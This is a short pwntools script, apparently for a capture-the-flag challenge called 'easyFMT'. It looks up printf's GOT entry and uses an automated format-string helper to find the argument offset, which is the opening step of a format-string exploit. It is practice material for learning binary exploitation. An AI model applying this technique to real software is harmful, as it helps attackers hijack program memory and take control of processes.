from pwn import *



context(arch='i386',os='linux')
context.terminal=["tmux","splitw","-h"]

elf =ELF("./easyFMT")
printf_got=elf.got['printf']
log,info("printf_got: {0}".format(hex(printf_got)))

def exec_fmt(payload):
    r=process('./easyFMT')
    r.recvuntil('\n',drop=True)
    r.sendline(payload)
    return r.recv()

# gdb.attach(r, 'b printf')


if __name__ == '__main__':
    print("准备泄漏出(格式化字符串)在printf函数参数中的位置:")
    auto_fmtstr = FmtStr(exec_fmt)
    print("(格式化字符串)在printf函数中参数的位置是:{0}".format(auto_fmtstr.offset))
